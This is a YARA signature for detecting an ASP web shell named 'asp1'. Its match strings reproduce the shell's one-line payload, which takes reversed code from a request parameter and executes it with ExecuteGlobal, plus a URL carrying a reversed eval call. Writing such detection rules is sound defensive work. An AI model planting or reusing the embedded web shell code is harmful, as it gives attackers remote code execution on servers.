rule webshell_webshells_new_asp1 {
  meta:
    author = Spider
    comment = None
    date = 2014/03/28
    description = Web shells - generated from file asp1.asp
    family = asp1
    hacker = None
    hash = b63e708cd58ae1ec85cf784060b69cad
    judge = unknown
    license = https://creativecommons.org/licenses/by-nc/4.0/
    reference = None
    score = 70
    threatname = webshell[webshells]/new.asp1
    threattype = webshells
  strings:
    $s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
    $s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
  condition:
    1 of them
}